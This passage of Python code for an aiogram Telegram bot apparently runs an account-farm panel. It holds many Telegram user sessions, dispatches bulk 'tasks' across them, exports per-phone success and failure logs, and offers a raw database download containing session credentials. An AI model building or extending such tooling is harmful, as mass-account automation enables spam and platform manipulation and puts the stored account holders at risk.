        f"Workers are now executing your actions. Use `/taskreport_{task_id}` to check results."
    )
    
    bot = message.bot if hasattr(message, 'bot') else message.message.bot
    await bot.send_message(chat_id=user_id, text=response_msg)
    await state.clear()

# --- ADVANCED DIAGNOSTICS & LOG TRACKING REPORTS ---
@router.callback_query(F.data == "view_tasks")
async def view_tasks(callback: CallbackQuery):
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    async with aiosqlite.connect(db_mgr.db_path) as db:
        if role in ["admin", "owner", "super_owner"]:
            cursor = await db.execute("SELECT task_id, type, status, progress FROM tasks ORDER BY task_id DESC LIMIT 15")
        else:
            cursor = await db.execute("SELECT task_id, type, status, progress FROM tasks WHERE creator_id = ? ORDER BY task_id DESC LIMIT 15", (user_id,))
        rows = await cursor.fetchall()

    text = "📊 **Recent Operations Pipeline Log**\n\n"
    if not rows:
        text += "_Queue completely empty._"
    else:
        for row in rows:
            text += f"🔹 **Task #{row[0]}** ({row[1].upper()})\nStatus: `{row[2]}` | Progress: `{row[3]}`\n"
            text += f"↳ Inspect details: /taskreport_{row[0]}\n\n"

    buttons = [[InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]]
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

@router.message(F.text.startswith("/taskreport_"))
async def cmd_task_report(message: Message):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    try:
        task_id = int(message.text.split("_")[1])
    except (IndexError, ValueError):
        await message.answer("❌ Invalid command syntax format.")
        return

    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT creator_id, type, status, progress, success_report, failure_report, payload FROM tasks WHERE task_id = ?", (task_id,)) as cursor:
            row = await cursor.fetchone()

    if not row:
        await message.answer("❌ Task structural record log not found inside the database.")
        return

    creator_id, task_type, status, progress, success_rep, failure_rep, payload = row
    if role not in ["admin", "owner", "super_owner"] and creator_id != user_id:
        await message.answer("🚫 Security Violation: Access denied.")
        return

    passed_list = json.loads(success_rep) if success_rep else []
    failed_list = json.loads(failure_rep) if failure_rep else []

    report_text = (
        f"📊 **Manifest Diagnostics Report for Task #{task_id}**\n"
        f"⚙️ **Operation Vector Type:** `{task_type.upper()}`\n"
        f"🚦 **Execution State:** `{status}`\n"
        f"📈 **Progress Metric:** `{progress}`\n"
        f"📦 **Payload Setup Parameters:** `{payload}`\n\n"
        f"🟢 **Successful Actions:** `{len(passed_list)}` accounts\n"
        f"🔴 **Failed Actions:** `{len(failed_list)}` accounts\n"
    )

    buttons = []
    if failed_list or passed_list:
        buttons.append([InlineKeyboardButton(text="📥 Download Full Manifest File", callback_data=f"exp_report:{task_id}")])
    buttons.append([InlineKeyboardButton(text="🔙 Main Menu", callback_data="main_menu")])

    await message.answer(report_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

@router.callback_query(F.data.startswith("exp_report:"))
async def export_task_report_file(callback: CallbackQuery):
    task_id = int(callback.data.split(":")[1])
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)

    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT creator_id, success_report, failure_report FROM tasks WHERE task_id = ?", (task_id,)) as cursor:
            row = await cursor.fetchone()

    if not row:
        await callback.answer("Task not found.")
        return
        
    creator_id, success_rep, failure_rep = row
    if role not in ["admin", "owner", "super_owner"] and creator_id != user_id:
        await callback.answer("Access denied.")
        return

    passed_list = json.loads(success_rep) if success_rep else []
    failed_list = json.loads(failure_rep) if failure_rep else []

    output_lines = [
        f"=== MANIFEST ENGINE LOG REPORT FOR AUTOMATION TASK #{task_id} ===",
        f"Generated At: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"PASSED ACCOUNTS BRIDGES ({len(passed_list)}):",
    ]
    for p in passed_list:
        output_lines.append(f" [+] +{p}: OPERATIONAL SUCCESS")
        
    output_lines.append("\nFAILED ACCOUNTS WITH LOG ERROR CONTEXTS:")
    for phone, reason in failed_list:
        output_lines.append(f" [-] +{phone}: CRITICAL FAILURE | Trace Log context: {reason}")

    raw_bytes = "\n".join(output_lines).encode("utf-8")
    file_payload = BufferedInputFile(raw_bytes, filename=f"task_{task_id}_firmware_log.txt")
    
    await callback.message.reply_document(file_payload, caption=f"📂 Complete execution profile log file for task #{task_id}.")
    await callback.answer()

# --- REFERRAL NETWORK INTERFACE ---
@router.callback_query(F.data == "view_referrals")
async def view_referrals(callback: CallbackQuery):
    user_id = callback.from_user.id
    bot_info = await callback.bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start=ref_{user_id}"

    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT COUNT(*) FROM users WHERE referred_by = ?", (user_id,)) as cursor:
            count = (await cursor.fetchone())[0]

    text = (
        f"👥 **Referral Network Matrix**\n\n"
        f"🔗 **Your Direct Invite link:**\n`{ref_link}`\n\n"
        f"📈 **Registered nodes across matrix:** `{count}` verified users."
    )
    buttons = [[InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]]
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

# --- ADMINISTRATIVE SYSTEM CONTROL DASHBOARDS ---
@router.callback_query(F.data == "admin_panel")
async def handle_admin_panel(callback: CallbackQuery):
    role = await db_mgr.get_user_role(callback.from_user.id)
    if role not in ["admin", "owner", "super_owner"]:
        await callback.answer("🚫 Access Denied.", show_alert=True)
        return
    
    buttons = [
        [InlineKeyboardButton(text="📢 Global Broadcast Notification", callback_data="admin_broadcast")],
        [InlineKeyboardButton(text="⚙️ Adjust Account Allocation Limits", callback_data="admin_set_limits")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]
    ]
    
    await callback.message.edit_text(
        "🛠️ **Administrative Infrastructure Management Console**\n\n"
        "Configure core nodes, adjust permissions, or broadcast system notifications.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons)
    )

@router.callback_query(F.data == "admin_broadcast")
async def admin_broadcast_start(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("📢 **Send Broadcast Message:**\nEnter the text notification to broadcast to all registered database users:")
    await state.set_state(AdminConsoleStates.waiting_for_broadcast)

@router.message(StateFilter(AdminConsoleStates.waiting_for_broadcast))
async def admin_broadcast_execute(message: Message, state: FSMContext):
    broadcast_text = message.text
    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT user_id FROM users") as cursor:
            users = [row[0] for row in await cursor.fetchall()]
            
    await message.answer(f"⚡ Dispatched broadcast queue sequence across `{len(users)}` users...")
    
    success_count = 0
    for u_id in users:
        try:
            await message.bot.send_message(chat_id=u_id, text=f"📢 **Global Infrastructure Notification:**\n\n{broadcast_text}")
            success_count += 1
            await asyncio.sleep(0.05) # Prevent flooding limits
        except Exception:
            pass
            
    await message.answer(f"✅ Broadcast transmission completed. Delivery success rate: `{success_count}/{len(users)}` structures.")
    await state.clear()

@router.callback_query(F.data == "admin_set_limits")
async def admin_set_limits_start(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("🆔 Enter the target **User ID** to configure account limits:")
    await state.set_state(AdminConsoleStates.waiting_for_limit_id)

@router.message(StateFilter(AdminConsoleStates.waiting_for_limit_id))
async def admin_set_limits_id(message: Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("❌ Target must be an integer User ID. Cancelled.")
        await state.clear()
        return
    await state.update_data(target_user_id=int(message.text.strip()))
    await message.answer("🔢 Enter the new **Maximum Account Limit** for this user:")
    await state.set_state(AdminConsoleStates.waiting_for_limit_val)

@router.message(StateFilter(AdminConsoleStates.waiting_for_limit_val))
async def admin_set_limits_finalize(message: Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("❌ Limit must be an integer digit. Cancelled.")
        await state.clear()
        return
    
    limit_val = int(message.text.strip())
    state_data = await state.get_data()
    target_user_id = state_data.get("target_user_id")
    
    async with aiosqlite.connect(db_mgr.db_path) as db:
        await db.execute("UPDATE users SET max_accounts = ? WHERE user_id = ?", (limit_val, target_user_id))
        await db.commit()
        
    await message.answer(f"✅ Configuration verified. User ID `{target_user_id}` allocation cap shifted to `{limit_val}` accounts.")
    await state.clear()

@router.callback_query(F.data == "backup_panel")
async def backup_panel(callback: CallbackQuery):
    role = await db_mgr.get_user_role(callback.from_user.id)
    if role not in ["owner", "super_owner"]:
        await callback.answer("🚫 Access Denied.", show_alert=True)
        return
    buttons = [
        [InlineKeyboardButton(text="📥 Download Raw DB Image", callback_data="export_db")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]
    ]
    await callback.message.edit_text("💾 **Core System Database Image Exporter Hub**", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

@router.callback_query(F.data == "export_db")
async def export_db(callback: CallbackQuery):
    role = await db_mgr.get_user_role(callback.from_user.id)
    if role not in ["owner", "super_owner"]:
        await callback.answer("🚫 Access Denied.", show_alert=True)
        return
    try:
        if not os.path.exists(db_mgr.db_path):
            await callback.answer("Database file target missing natively.", show_alert=True)
            return
            
        with open(db_mgr.db_path, "rb") as f:
            file_data = f.read()
        file = BufferedInputFile(file_data, filename="database_core_backup.db")
        await callback.message.reply_document(file, caption="📂 Current core SQLite structure structural backup image.")
        await callback.answer("Export sequence finalized successfully.")
    except Exception as e:
        await callback.answer(f"❌ Structural export error: {str(e)}", show_alert=True)

@router.callback_query(F.data == "system_stats")
async def system_stats(callback: CallbackQuery):
    role = await db_mgr.get_user_role(callback.from_user.id)
    if role not in ["owner", "super_owner"]:
        await callback.answer("🚫 Access Denied.", show_alert=True)
        return

    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT COUNT(*) FROM users") as c1:
            total_users = (await c1.fetchone())[0]
        async with db.execute("SELECT COUNT(*) FROM accounts") as c2:
            total_accounts = (await c2.fetchone())[0]
        async with db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'") as c3:
            active_accounts = (await c3.fetchone())[0]
        async with db.execute("SELECT COUNT(*) FROM tasks") as c4:
            total_tasks = (await c4.fetchone())[0]

    stats_text = (
        f"📊 **Core Operational Telemetry Indicators**\n\n"
        f"👥 **Total User Records Saved:** `{total_users}`\n"
        f"📱 **Total MTProto Sessions:** `{total_accounts}`\n"
        f"🟢 **Active Bridge Connections:** `{active_accounts}`\n"
        f"🔴 **Dropped/Dead Bridge Nodes:** `{total_accounts - active_accounts}`\n"
        f"⚡ **Total Processed Automation Tasks:** `{total_tasks}`"
    )
    buttons = [[InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]]
    await callback.message.edit_text(stats_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

# --- SYSTEM HEALTH CHECK & RECOVERY AGENT ---
async def verify_saved_sessions():
    """System diagnostic running sequence pings to sweep dead or banned nodes."""
    logger.info("Running verification pings across system bridges...")
    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT phone, session_string FROM accounts WHERE status = 'active'") as cursor:
            accounts = await cursor.fetchall()

    for phone, enc_session in accounts:
        if not enc_session:
            continue
        try:
            client = TelegramClient(StringSession(decrypt_data(enc_session)), API_ID, API_HASH)
            await client.connect()
            if not await client.is_user_authorized():
                logger.warning(f"Bridge connection verification dropped for +{phone}. Flagging dead.")
                async with aiosqlite.connect(db_mgr.db_path) as db_conn:
                    await db_conn.execute("UPDATE accounts SET status = 'dead' WHERE phone = ?", (phone,))
                    await db_conn.commit()
            await client.disconnect()
        except (UserDeactivatedError, AuthKeyUnregisteredError):
            async with aiosqlite.connect(db_mgr.db_path) as db_conn:
                await db_conn.execute("UPDATE accounts SET status = 'dead' WHERE phone = ?", (phone,))
                await db_conn.commit()
        except Exception as e:
            logger.error(f"Error establishing network handshake ping for +{phone}: {e}")

# --- CORE BOOTSTRAP RUNTIME ENTRY ---
async def main():
    # Initialize components
    await db_mgr.init()
    await verify_saved_sessions()

    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)

    # Initialize task execution queue worker loops
    worker_task = asyncio.create_task(task_queue.start_worker())
    logger.info("Application attached to network polling loops.")
    
    try:
        await dp.start_polling(bot)
    finally:
        worker_task.cancel()
        await bot.session.close()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Process execution cleanly terminated.")
